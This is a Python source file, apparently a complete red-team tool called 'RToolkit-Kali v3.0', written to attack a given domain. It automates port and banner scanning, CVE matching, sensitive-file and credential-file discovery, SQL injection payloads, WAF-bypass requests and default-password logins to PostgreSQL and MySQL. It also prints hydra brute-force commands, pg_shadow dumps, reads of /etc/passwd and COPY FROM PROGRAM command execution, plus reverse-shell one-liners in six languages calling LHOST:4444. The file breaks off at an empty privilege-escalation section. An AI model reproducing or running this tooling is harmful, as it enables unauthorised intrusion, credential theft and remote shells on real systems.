#!/usr/bin/env python3
"""
RToolkit-Kali v3.0 — MASTER RED TEAM TOOL
Satu file untuk semua jenis serangan:
  Recon | Port+Banner Grab | CVE Match | Dir Bruteforce | Parameter Discovery
  SQLi | Nuclei | Nikto | WPScan | DB Exploit | Reverse Shell | Reporting

Auto-detect Kali tools — fallback ke pure Python jika tidak tersedia.
Helpers: gen_cve.py (update CVE), cve_data.json (database CVE).
"""
import os, sys, json, socket, ssl, subprocess, tempfile, datetime, re, shutil, time, signal, struct
import concurrent.futures, ipaddress, hashlib, base64, xml.etree.ElementTree as ET
from pathlib import Path
from urllib.parse import urlparse, quote, urljoin

R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"; C = "\033[96m"
M = "\033[95m"; W = "\033[97m"; N = "\033[0m"; DIM = "\033[2m"; BOLD = "\033[1m"

HAS_REQUESTS = False
try:
    import requests; import urllib3; urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning); HAS_REQUESTS = True
except ImportError: pass

HAS_COLORAMA = False
try:
    from colorama import init, Fore, Style; init(); HAS_COLORAMA = True
    R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; C = Fore.CYAN
    W = Fore.WHITE; M = Fore.MAGENTA; N = Style.RESET_ALL; DIM = Style.DIM; BOLD = Style.BRIGHT
except: pass

RESULTS_DIR = Path("kali_results")
CVE_DB = {}
cve_path = Path(__file__).parent / "cve_data.json"
if cve_path.exists():
    try: CVE_DB = json.loads(cve_path.read_text(encoding='utf-8'))
    except: pass

REPORT = {"target":"","timestamp":"","domains":[],"ips":[],"ports":[],"services":[],"cves":[],
    "technologies":[],"directories":[],"parameters":[],"vulnerabilities":[],"subdomains":[],
    "exploit_commands":[],"summary":{"total":0,"critical":0,"high":0,"medium":0,"low":0,"info":0}}

def c(text, color): return f"{color}{text}{N}"
SEV_COLORS = {"CRITICAL":R,"HIGH":R,"MEDIUM":Y,"LOW":B,"INFO":C}

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{R}
╔══════════════════════════════════════════════════════════════╗
║{W}  ██████╗ ████████╗ ██████╗  ██████╗ ██╗  ██╗██╗     ██╗████████╗{R} ║
║{W}  ██╔══██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║ ██╔╝██║     ██║╚══██╔══╝{R} ║
║{W}  ██████╔╝   ██║   ██║   ██║██║   ██║█████╔╝ ██║     ██║   ██║   {R} ║
║{W}  ██╔══██╗   ██║   ██║   ██║██║   ██║██╔═██╗ ██║     ██║   ██║   {R} ║
║{W}  ██║  ██║   ██║   ╚██████╔╝╚██████╔╝██║  ██╗███████╗██║   ██║   {R} ║
║{W}  ╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝   {R} ║
║{Y}  v3.0 MASTER — Recon | CVE | Exploit | DB | Kali + Pure Python{R} ║
╚══════════════════════════════════════════════════════════════╝{N}""")

def print_table(headers, rows, title=None):
    if not rows: return
    col_widths = [len(h)+2 for h in headers]
    for row in rows:
        for i,cell in enumerate(row):
            clean = re.sub(r'\x1b\[[0-9;]*m','',str(cell))
            col_widths[i] = max(col_widths[i], len(clean)+2)
    sep = '+' + '+'.join('─'*w for w in col_widths) + '+'
    if title: print(f"\n  {c(title,C)}")
    print(f"  {c(sep,DIM)}")
    hdr = ' │ '.join(h.center(col_widths[i]) for i,h in enumerate(headers))
    print(f"  {c('│',DIM)} {hdr} {c('│',DIM)}")
    print(f"  {c(sep,DIM)}")
    for row in rows:
        cells = []
        for i,cell in enumerate(row):
            clean = re.sub(r'\x1b\[[0-9;]*m','',str(cell))
            pad = col_widths[i] - len(clean) - 2
            cells.append(str(cell)+' '*pad)
        print(f"  {c('│',DIM)} {' │ '.join(cells)} {c('│',DIM)}")
    print(f"  {c(sep,DIM)}")

def run_cmd(cmd, timeout=120, desc=""):
    if desc: print(f"  {c(f'→ {desc}',C)}")
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return proc.stdout, proc.stderr, proc.returncode==0
    except subprocess.TimeoutExpired: return "", "TIMEOUT", False
    except Exception as e: return "", str(e), False

# ─── CVE ENGINE ──────────────────────────────────────────────────
def version_to_cves(service_name, version):
    matches = []
    if not version: return matches
    db_key = service_name.lower().replace(' ', '').replace('-', '')
    if db_key not in CVE_DB: return matches
    for db_ver, vulns in CVE_DB[db_key].items():
        if version == db_ver: matches.extend(vulns)
    return matches

def risk_level(cve_text):
    t = cve_text.lower()
    if any(w in t for w in ['rce','critical','remote code','buffer overrun','code injection','heap overflow','sqli']): return "CRITICAL"
    if any(w in t for w in ['high','privesc','privilege escalation','ssrf','traversal','memory corruption','xss']): return "HIGH"
    if any(w in t for w in ['medium','dos','info leak','spoof','bypass']): return "MEDIUM"
    return "LOW"

def add_cve(port, svc, software, version, cve_text):
    sev = risk_level(cve_text)
    REPORT["cves"].append({"port":port,"service":svc,"software":software,"version":version,"cve":cve_text,"severity":sev})
    REPORT["summary"][sev.lower()] = REPORT["summary"].get(sev.lower(),0)+1
    REPORT["summary"]["total"] += 1

EXPLOIT_SUGGESTIONS = {
    "apache2.4.38": [
        "msfconsole -q -x 'use exploit/multi/http/apache_mod_proxy_rce; set RHOSTS TARGET; run'",
        "python3 CVE-2019-0211.py TARGET",
    ],
    "openssh9.6": [
        "python3 CVE-2024-6387.py TARGET 22",
    ],
    "php8.1": [
        "phpggc -p phar -o exploit.phar 'RCE:system(id)'",
    ],
    "postgresql": [
        "psql -h TARGET -p 5432 -U postgres -c \"SELECT version();\"",
        "PGPASSWORD='PASS' psql -h TARGET -U postgres -d postgres",
    ],
}

def suggest_exploit(software, version):
    key = software.lower().replace('.','')[:8]  # e.g. 'apache2.'
    for k, cmds in EXPLOIT_SUGGESTIONS.items():
        if k.startswith(key):
            return cmds
    return []

# ─── SOCKET PROBES ──────────────────────────────────────────────
PROBE_PORTS = [21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,587,
    636,993,995,1080,1433,1521,2049,2083,2181,2375,2376,3000,3001,3306,3389,
    3632,4444,5000,5432,5555,5800,5900,5901,5985,5986,6379,6443,7000,7070,
    8000,8001,8008,8080,8081,8090,8443,8880,8888,9000,9001,9042,9092,9094,
    9200,9300,9418,9999,10000,11211,27017,27018,50070,50075,50090]

def port_scan(ip, ports=None):
    if ports is None: ports = PROBE_PORTS
    open_ports = []
    def scan(p):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(0.5)
            if s.connect_ex((ip,p)) == 0: open_ports.append(p)
            s.close()
        except: pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as ex:
        ex.map(scan, ports)
    return sorted(open_ports)

def probe_http(ip, port, use_ssl=False):
    r = {"port":port,"protocol":"https" if use_ssl else "http","server":"","powered":"","techs":{},"title":"","banner":""}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(3)
        if use_ssl:
            ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
            s = ctx.wrap_socket(s)
        s.connect((ip,port))
        s.send(f"GET / HTTP/1.0\r\nHost: {ip}:{port}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: close\r\n\r\n".encode())
        resp = b""
        while True:
            try:
                c2 = s.recv(4096)
                if not c2: break
                resp += c2
            except: break
        s.close()
        he = resp.find(b"\r\n\r\n")
        if he == -1: return r
        hdr = resp[:he].decode('utf-8',errors='replace')
        body = resp[he+4:].decode('utf-8',errors='replace')
        headers = {}
        for line in hdr.split('\r\n')[1:]:
            if ':' in line:
                k,v = line.split(':',1); headers[k.strip().lower()] = v.strip()
        r["server"] = headers.get("server","")
        r["powered"] = headers.get("x-powered-by","")
        tm = re.search(r'<title>([^<]+)</title>', body, re.I)
        if tm: r["title"] = tm.group(1).strip()[:100]
        r["banner"] = body[:300]
        srv = r["server"].lower()
        if "apache" in srv:
            m = re.search(r'Apache[ /](\d+\.\d+(?:\.\d+)?)', r["server"], re.I)
            if m: r["techs"]["apache"] = m.group(1)
        if "nginx" in srv:
            m = re.search(r'nginx[ /]?(\d+\.\d+(?:\.\d+)?)', r["server"], re.I)
            if m: r["techs"]["nginx"] = m.group(1)
        if "openresty" in srv:
            m = re.search(r'openresty[ /]?(\d+\.\d+(?:\.\d+)?)', r["server"], re.I)
            if m: r["techs"]["openresty"] = m.group(1)
            nm = re.search(r'nginx[ /](\d+\.\d+(?:\.\d+)?)', r["server"], re.I)
            if nm: r["techs"]["nginx"] = nm.group(1)
        if "php" in r["powered"].lower():
            m = re.search(r'PHP[ /](\d+\.\d+(?:\.\d+)?)', r["powered"], re.I)
            if m: r["techs"]["php"] = m.group(1)
    except: pass
    return r

def probe_ssh(ip, port=22):
    r = {"version":"","banner":""}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(4)
        s.connect((ip,port))
        b = s.recv(1024).decode('utf-8',errors='replace').strip(); s.close()
        r["banner"] = b[:300]
        m = re.search(r'SSH-\d+\.\d+-([^\s]+)', b)
        if m: r["version"] = m.group(1)
    except: pass
    return r

def probe_pgsql(ip, port=5432):
    r = {"version":"","auth_method":"","banner":""}
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(4)
        s.connect((ip,port))
        username = b"postgres\x00"
        params = b"user\x00"+username+b"database\x00postgres\x00\x00"
        length = struct.pack('!I',8+4+len(params))
        startup = b'\x00\x03\x00\x00'+length[1:]+params
        s.send(startup)
        resp = s.recv(4096); s.close()
        if len(resp)<5: return r
        msg_type = chr(resp[0])
        payload = resp[5:]
        if msg_type == 'R' and len(payload)>=4:
            auth_type = struct.unpack('!I',payload[:4])[0]
            auth_names = {0:"OK",2:"KerberosV5",3:"CleartextPassword",5:"SCM Credential",6:"GSS",9:"SASL"}
            r["auth_method"] = auth_names.get(auth_type,f"Type_{auth_type}")
        elif msg_type == 'E':
            r["banner"] = re.sub(r'\x00',' ',payload.decode('utf-8',errors='replace'))[:300]
            ver_m = re.search(r'(\d+\.\d+(?:\.\d+)?)',r["banner"])
            if ver_m: r["version"] = ver_m.group(1)
        # Server version from ParameterStatus
        pos = 0
        while pos < len(resp):
            if pos+5>len(resp): break
            mtype = chr(resp[pos])
            mlen = struct.unpack('!I',resp[pos+1:pos+5])[0]
            if mtype == 'S' and pos+5<len(resp):
                chunk = resp[pos+5:pos+mlen]
                parts = chunk.split(b'\x00')
                for i,p in enumerate(parts):
                    if p == b'server_version' and i+1<len(parts):
                        r["version"] = parts[i+1].decode('utf-8',errors='replace')
            pos += mlen
    except: pass
    return r

def probe_mysql(ip, port=3306):
    r = {"version":"","banner":""}
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(4)
        s.connect((ip,port))
        resp = s.recv(1024); s.close()
        if len(resp)>=5:
            end = resp.find(b'\x00',5)
            if end>5: r["version"] = resp[5:end].decode('utf-8',errors='replace')
    except: pass
    return r

def probe_banner(ip, port):
    r = {"banner":""}
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(3)
        s.connect((ip,port))
        try: s.send(b"\r\n")
        except: pass
        try:
            b2 = s.recv(1024).decode('utf-8',errors='replace').strip()
            if b2: r["banner"] = b2[:300]
        except: pass
        s.close()
    except: pass
    return r

# ─── RECON ───────────────────────────────────────────────────────
def phase_recon(domain):
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 1: RECONNAISSANCE',BOLD)}")
    print(f"{c('='*65,Y)}")
    target_ip = ""
    try:
        target_ip = socket.gethostbyname(domain); REPORT["ips"].append(target_ip)
        print(f"\n  {c('[+] IP:',G)} {c(target_ip,W)}")
    except: print(f"  {c('[!] Could not resolve domain',R)}")

    tools = {}
    for t in ["nuclei","dirsearch","ffuf","whatweb","nmap","subfinder","httpx","nikto","sqlmap","gobuster","wpscan","arjun","x8","paramspider"]:
        tools[t] = shutil.which(t) is not None
    print(f"\n  {c('[+] Tools:', G)} {' '.join(c('✓',G) if tools[t] else c('✗',R)+t[:3] for t in ['nmap','nuclei','sqlmap','whatweb','ffuf','dirsearch'])}")

    # 1a. Nmap
    if tools["nmap"]:
        print(f"\n  {c('[+] Nmap Port Scan',G)}")
        stdout,_,ok = run_cmd(f"nmap -sS -sV -T4 --top-ports 100 --open -oN {RESULTS_DIR}/nmap.txt {domain}",300)
        if ok and stdout:
            for line in stdout.split('\n'):
                m = re.search(r'^(\d+)/tcp\s+open\s+(\S+)',line)
                if m: REPORT["ports"].append(f"{m.group(1)}/tcp ({m.group(2)})")
            print(f"  {c('nmap done',G)}")

    # 1b. Pure Python port scan (always)
    print(f"\n  {c('[+] Port Scan (Pure Python)',G)}")
    open_ports = port_scan(target_ip or domain)
    print(f"  Found {c(len(open_ports),W)} open ports")
    if open_ports:
        pt = [[str(p),socket.getservbyport(p,'tcp') if p<1024 else ""] for p in open_ports[:25]]
        print_table(["Port","Service"],pt,"[OPEN PORTS]")

    # 1c. Banner grabbing
    print(f"\n  {c('[+] Banner Grab + Version Detection',G)}")
    services = []
    for port in open_ports:
        svc = {"port":port,"protocol":"","version":"","techs":{},"banner":"","title":""}
        if port in [80,8000,8008,8080,8090,8888,9000,3000,3001,5000,8081,8880]:
            info = probe_http(ip=target_ip or domain, port=port, use_ssl=False)
            svc.update(info)
        elif port in [443,8443,9443,6443]:
            info = probe_http(ip=target_ip or domain, port=port, use_ssl=True)
            svc.update(info)
        elif port == 22:
            info = probe_ssh(ip=target_ip or domain)
            svc["protocol"]="ssh"; svc["version"]=info["version"]; svc["banner"]=info["banner"]
        elif port == 5432:
            info = probe_pgsql(ip=target_ip or domain)
            svc["protocol"]="postgresql"; svc["version"]=info["version"]; svc["banner"]=f"Auth: {info['auth_method']}"
        elif port == 3306:
            info = probe_mysql(ip=target_ip or domain)
            svc["protocol"]="mysql"; svc["version"]=info["version"]; svc["banner"]=info["banner"]
        elif port in [6379]:
            info = probe_banner(ip=target_ip or domain, port=port)
            svc["protocol"]="redis"; svc["banner"]=info["banner"]
        elif port in [27017,27018]:
            svc["protocol"]="mongodb"
        else:
            info = probe_banner(ip=target_ip or domain, port=port)
            svc["banner"]=info["banner"][:50]
        services.append(svc)
    REPORT["services"]=services

    # Display services
    svc_table = []
    for s in services:
        ver = s.get("version","") or "-"
        tech_str = "; ".join(f"{k}={v}" for k,v in s.get("techs",{}).items()) or s.get("banner","")[:40]
        svc_table.append([str(s["port"]),s.get("protocol","-"),ver,tech_str,s.get("title","")[:30]])
    print_table(["Port","Proto","Version","Detail","Title"],svc_table,"[SERVICES]")

    # 1d. CVE matching from banners
    print(f"\n  {c('[+] CVE Mapping from Versions',G)}")
    cve_count = 0
    for s in services:
        for app, ver in s.get("techs",{}).items():
            cves = version_to_cves(app, ver)
            for cv in cves:
                add_cve(s["port"],s.get("protocol",""),app,ver,cv)
                cve_count += 1
        if s.get("protocol")=="ssh" and s.get("version"):
            cves = version_to_cves("openssh", s["version"])
            for cv in cves:
                add_cve(s["port"],"ssh","OpenSSH",s["version"],cv); cve_count+=1
    if REPORT["cves"]:
        ct = [[c(str(cv["port"]),W),cv["service"],cv["software"],cv["version"],
               c(cv["cve"][:55],SEV_COLORS.get(cv["severity"],W)),c(cv["severity"],SEV_COLORS.get(cv["severity"],W))]
              for cv in REPORT["cves"]]
        print_table(["Port","Svc","Software","Ver","CVE","Sev"],ct[:30],f"[CVEs FOUND ({len(REPORT['cves'])} total)]")
    else:
        print(f"  {c('No CVEs matched',G)}")

    # 1e. whatweb
    if tools["whatweb"]:
        print(f"\n  {c('[+] WhatWeb Technology Detection',G)}")
        stdout,_,_ = run_cmd(f"whatweb -a 3 --log-json={RESULTS_DIR}/whatweb.json {domain}",120)
        if stdout:
            for line in stdout.split('\n'):
                m = re.findall(r'(\w[\w+]*)\[([^\]]+)\]',line)
                for tname,tver in m: REPORT["technologies"].append(f"{tname}: {tver}")
            print(f"  {c('whatweb done',G)}")

    # 1f. Subfinder
    if tools["subfinder"]:
        print(f"\n  {c('[+] Subfinder',G)}")
        stdout,_,_ = run_cmd(f"subfinder -d {domain} -silent -o {RESULTS_DIR}/subdomains.txt",120)
        if stdout:
            for s in stdout.strip().split('\n'):
                s=s.strip()
                if s: REPORT["subdomains"].append(s)
            print(f"  Found {c(len(REPORT['subdomains']),W)} subdomains")

    return tools

# ─── DIRECTORY ENUM ──────────────────────────────────────────────
DIR_WORDLIST = ["admin","login","wp-admin","wp-content","wp-includes","uploads",
    "files","backup","db",".git/HEAD",".env","config","robots.txt","sitemap.xml",
    "phpinfo.php","info.php","api","api/v1","graphql","swagger","docs","css","js",
    "images","assets","static","vendor","node_modules","install","setup","error",
    "logs","cache","tmp","page","blog","user","users","account","register","search",
    "cart","checkout","download","ajax","includes","themes","templates","server-status",
    "cgi-bin","xmlrpc.php","administrator","phpmyadmin","webdav",".git/config",
    ".aws/credentials","Dockerfile","docker-compose.yml","nginx.conf","web.config",
    "composer.json","package.json","requirements.txt","Makefile","Jenkinsfile",
    "wp-json","wp-login.php","wp-cron.php","index.php","index.html","favicon.ico"]

def phase_dirs(domain):
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 2: DIRECTORY ENUMERATION',BOLD)}")
    print(f"{c('='*65,Y)}")
    url = f"https://{domain}"
    found = []

    # Pure Python dir bruteforce (works everywhere)
    print(f"\n  {c('[+] Pure Python Dir Bruteforce',G)}")
    print(f"  Testing {c(len(DIR_WORDLIST),W)} paths...")
    if HAS_REQUESTS:
        for path in DIR_WORDLIST:
            try:
                r = requests.get(f"{url}/{path}", timeout=3, allow_redirects=False, verify=False,
                               headers={'User-Agent':'Mozilla/5.0'})
                if r.status_code in [200,301,302,401,403,500,405]:
                    found.append([str(r.status_code),f"/{path}",f"{len(r.text)}B"])
                    REPORT["directories"].append({"url":f"{url}/{path}","status":r.status_code})
            except: pass
    if found:
        print_table(["Status","Path","Size"],found[:30],f"[DIRS ({len(found)} found)]")

    # dirsearch (Kali)
    tools = {t:shutil.which(t) for t in ["dirsearch","ffuf","gobuster"]}
    if tools.get("dirsearch"):
        print(f"\n  {c('[+] Dirsearch',G)}")
        run_cmd(f"dirsearch -u {url} -w /usr/share/wordlists/dirb/common.txt -e php,asp,txt,conf,bak,zip,log -t 50 --format plain -o {RESULTS_DIR}/dirsearch.txt 2>/dev/null",300)

# ─── SQLi + WAF BYPASS ──────────────────────────────────────────
SQLI_PAYLOADS = ["'","\"","')","' OR '1'='1","' OR 1=1 -- -","\" OR 1=1 -- -",
    "' AND SLEEP(3) -- -","1' AND pg_sleep(3) -- -","' UNION SELECT 1 -- -"]
SQLI_ERRORS = {"MySQL":[r"SQL syntax.*MySQL",r"MySQLSyntaxError",r"#1064",r"#1054"],
    "PostgreSQL":[r"PostgreSQL.*ERROR",r"PSQLException",r"invalid input syntax"],
    "MSSQL":[r"SQL Server.*Driver",r"Unclosed quotation mark",r"Line \d+"]}

def sqli_check(url):
    findings = []
    if not HAS_REQUESTS: return findings
    params_found = set()
    try:
        r = requests.get(url, timeout=5, verify=False)
        for m in re.findall(r'<input[^>]*name=["\']([^"\']+)["\']',r.text,re.I): params_found.add(m)
        parsed = urlparse(url)
        if parsed.query:
            for pair in parsed.query.split('&'):
                if '=' in pair: params_found.add(pair.split('=')[0])
    except: pass
    params = list(params_found)[:10] if params_found else ["id","page","q","s","search","cat","file"]
    for param in params:
        for payload in SQLI_PAYLOADS:
            try:
                test_url = re.sub(f'({re.escape(param)}=)[^&]*', f'\\1{quote(payload)}', url) if '?' in url else f"{url}?{param}={quote(payload)}"
                r = requests.get(test_url, timeout=5, verify=False)
                for db,pats in SQLI_ERRORS.items():
                    for pat in pats:
                        if re.search(pat,r.text,re.I):
                            findings.append({"type":f"Error-Based ({db})","param":param,"payload":payload,"severity":"CRITICAL"})
                            return findings
            except: pass
    return findings

def waf_bypass(base_url, path):
    if not HAS_REQUESTS: return None
    parsed = urlparse(base_url); host = parsed.netloc
    for bypass in [
        f"{base_url.rstrip('/')}{path}",
        f"{base_url.rstrip('/')}{path}?",
        f"{base_url.rstrip('/')}/./{path.lstrip('/')}",
        f"{base_url.rstrip('/')}//{path.lstrip('/')}",
        f"{base_url.rstrip('/')}/{path.lstrip('/').upper()}",
    ]:
        try:
            r = requests.get(bypass, timeout=3, verify=False, allow_redirects=False, headers={
                "User-Agent":"Mozilla/5.0","X-Forwarded-For":"127.0.0.1"})
            if r.status_code==200 and len(r.text)>200 and "request rejected" not in r.text.lower():
                return {"content":r.text[:2000],"technique":bypass[-30:]}
        except: pass
    return None

# ─── VULN SCAN ───────────────────────────────────────────────────
SENSITIVE_PATHS = ["/.env","/.git/config","/.git/HEAD","/admin/.env","/phpinfo.php",
    "/wp-content/debug.log","/wp-config.php.bak","/config.php","/dump.sql","/backup.sql",
    "/.htaccess","/server-status","/.aws/credentials","/Dockerfile","/docker-compose.yml",
    "/terraform.tfstate","/storage/logs/laravel.log","/composer.json","/package.json"]

def phase_vuln(domain, tools):
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 3: VULNERABILITY SCAN',BOLD)}")
    print(f"{c('='*65,Y)}")
    url = f"https://{domain}"

    # Nuclei
    if tools.get("nuclei"):
        for sev in ["critical","high","medium"]:
            print(f"\n  {c(f'[+] Nuclei {sev.upper()}',G)}")
            run_cmd(f"nuclei -u {url} -severity {sev} -silent -json -o {RESULTS_DIR}/nuclei_{sev}.json 2>/dev/null",300)
            nfile = RESULTS_DIR/f"nuclei_{sev}.json"
            if nfile.exists():
                for line in nfile.read_text().strip().split('\n'):
                    try:
                        d = json.loads(line)
                        vu = d.get("matched-at",d.get("url",""))
                        vn = d.get("info",{}).get("name","")
                        vs = d.get("info",{}).get("severity","info").upper()
                        REPORT["vulnerabilities"].append({"url":vu,"name":vn,"severity":vs,"detail":"nuclei","exploit_cmd":f"curl -s '{vu}'"})
                    except: pass

    # Nikto
    if tools.get("nikto"):
        print(f"\n  {c('[+] Nikto',G)}")
        run_cmd(f"nikto -h {url} -Format json -output {RESULTS_DIR}/nikto.json 2>/dev/null",300)
        nfile = RESULTS_DIR/"nikto.json"
        if nfile.exists():
            try:
                data = json.loads(nfile.read_text())
                for item in data if isinstance(data,list) else data.get("items",[]):
                    if isinstance(item,dict):
                        REPORT["vulnerabilities"].append({"url":item.get("url",url),"name":item.get("message","")[:80],"severity":"MEDIUM","detail":"nikto","exploit_cmd":"# manual"})
            except: pass

    # Sensitive file exposure
    print(f"\n  {c('[+] Sensitive File Check',G)}")
    if HAS_REQUESTS:
        exposed = []
        for path in SENSITIVE_PATHS:
            try:
                r = requests.get(f"{url}{path}", timeout=3, verify=False, allow_redirects=False,
                               headers={"User-Agent":"Mozilla/5.0"})
                if r.status_code in [200,401,403] and "request rejected" not in r.text.lower()[:200]:
                    exposed.append([c("EXPOSED",R) if r.status_code==200 else c("RESTRICTED",Y),path,str(r.status_code)])
                    sev = "CRITICAL" if r.status_code==200 else "HIGH"
                    REPORT["vulnerabilities"].append({"url":f"{url}{path}","name":f"Sensitive: {path}","severity":sev,"detail":f"HTTP {r.status_code}","exploit_cmd":f"curl -s '{url}{path}'"})
                    if r.status_code==200:
                        exfil = waf_bypass(url,path)
                        if exfil:
                            sz = str(len(exfil["content"]))
                            print(f"  {c('  → '+path+': '+sz+'B content',G)}")
                        else: print(f"  {c('  → '+path+': accessible',G)}")
            except: pass
        if exposed: print_table(["Status","Path","HTTP"],exposed,"[SENSITIVE FILES]")

    # SQLi
    print(f"\n  {c('[+] SQL Injection Scan',G)}")
    sqli_results = sqli_check(url)
    if sqli_results:
        for sq in sqli_results:
            REPORT["vulnerabilities"].append({"url":f"{url}?{sq['param']}=1","name":f"SQLi via {sq['param']}","severity":"CRITICAL","detail":sq["type"],"exploit_cmd":f"sqlmap -u '{url}?{sq['param']}=1' --batch --dbs"})
        print(f"  {c(f'⚠ SQLi FOUND: {len(sqli_results)} findings!',R)}")
    else:
        print(f"  {c('No SQLi detected',G)}")

    # sqlmap (Kali)
    if tools.get("sqlmap") and REPORT["parameters"]:
        for p in REPORT["parameters"][:3]:
            print(f"\n  {c(f'[+] SQLMap on param: {p}',G)}")
            run_cmd(f"sqlmap -u '{url}?{p}=1' --batch --level 2 --output-dir={RESULTS_DIR}/sqlmap 2>/dev/null",180)

    # WPScan
    if tools.get("wpscan"):
        print(f"\n  {c('[+] WPScan',G)}")
        run_cmd(f"wpscan --url {url} --no-update --format json -o {RESULTS_DIR}/wpscan.json 2>/dev/null",300)

# ─── DB EXPLOITATION ─────────────────────────────────────────────
def phase_db(domain):
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 4: DATABASE EXPLOITATION',BOLD)}")
    print(f"{c('='*65,Y)}")

    # Check from services discovered
    db_found = False
    for s in REPORT["services"]:
        if s["protocol"] == "postgresql":
            db_found = True
            print(f"\n  {c('[!] PostgreSQL (5432) TERBUKA!',R)}")
            REPORT["vulnerabilities"].append({"url":f"postgresql://{domain}:5432","name":"PostgreSQL Exposed","severity":"CRITICAL","detail":"Port 5432 publik","exploit_cmd":f"psql -h {domain} -p 5432 -U postgres"})
            # Try default creds
            for user,pwd in [("postgres","postgres"),("postgres",""),("postgres","admin"),("postgres","password")]:
                stdout,_,ok = run_cmd(f"PGPASSWORD='{pwd}' psql -h {domain} -p 5432 -U {user} -c 'SELECT 1' -t 2>/dev/null",10,"")
                if ok or "SELECT 1" in stdout:
                    print(f"  {c(f'✓ LOGIN: {user}:{pwd}',G)}")
                    REPORT["vulnerabilities"].append({"url":f"postgresql://{domain}:5432","name":f"PostgreSQL Default Creds: {user}:{pwd}","severity":"CRITICAL","detail":"Default creds work","exploit_cmd":f"PGPASSWORD='{pwd}' psql -h {domain} -p 5432 -U {user} -d postgres"})
                    break
            # Exploit commands
            print(f"\n  {c('[⚡] PostgreSQL Exploit Commands:',R)}")
            for cmd in [
                f"hydra -l postgres -P /usr/share/wordlists/rockyou.txt {domain} -s 5432 postgres -t 4",
                f"PGPASSWORD='PASS' psql -h {domain} -U postgres -d postgres -c 'SELECT version()'",
                f"PGPASSWORD='PASS' psql -h {domain} -U postgres -c \"SELECT usename, passwd FROM pg_shadow;\"",
                f"PGPASSWORD='PASS' psql -h {domain} -U postgres -c \"COPY (SELECT pg_read_file('/etc/passwd')) TO STDOUT;\"",
                f"PGPASSWORD='PASS' psql -h {domain} -U postgres -c \"DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;\"",
            ]:
                print(f"    {c(cmd,DIM)}")

        if s["protocol"] == "mysql":
            db_found = True
            print(f"\n  {c('[!] MySQL (3306) TERBUKA!',R)}")
            REPORT["vulnerabilities"].append({"url":f"mysql://{domain}:3306","name":"MySQL Exposed","severity":"CRITICAL","detail":"Port 3306 publik","exploit_cmd":f"mysql -h {domain} -u root"})
            for user,pwd in [("root",""),("root","root"),("root","admin")]:
                stdout,_,ok = run_cmd(f"mysql -h {domain} -u {user} -p'{pwd}' -e 'SELECT 1' -s 2>/dev/null",10,"")
                if ok or "1" in stdout.strip():
                    print(f"  {c(f'✓ LOGIN: {user}:{pwd}',G)}")
                    break

    if not db_found:
        print(f"  {c('No public database services detected',G)}")

# ─── EXPLOITATION ────────────────────────────────────────────────
def phase_exploit(domain):
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 5: EXPLOITATION ENGINE',BOLD)}")
    print(f"{c('='*65,Y)}")

    # Reverse shells
    print(f"\n  {c('[+] Reverse Shell Payloads',G)}")
    lhost = "LHOST"
    shells = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/4444 0>&1",
        "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "php": f"php -r '$sock=fsockopen(\"{lhost}\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "nc": f"nc -e /bin/sh {lhost} 4444",
        "powershell": f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient(\'{lhost}\',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\"PS \"+(pwd).Path+\"> \";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()"',
        "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    }
    for st,cmd in list(shells.items())[:6]:
        print(f"    {c(st+':',C)} {cmd[:70]}...")

    # Generate exploit commands from CVEs
    if REPORT["cves"]:
        print(f"\n  {c('[⚡] Exploit Commands from Discovered CVEs:',R)}")
        seen = set()
        for cv in REPORT["cves"]:
            for cmd in suggest_exploit(cv["software"], cv["version"]):
                if cmd not in seen:
                    seen.add(cmd)
                    print(f"    {c('➜',M)} {cmd.replace('TARGET',domain)}({cv['cve'][:40]})")

    # Privesc
    print(f"\n  {c('[+] Privesc Cheatsheet',G)}")
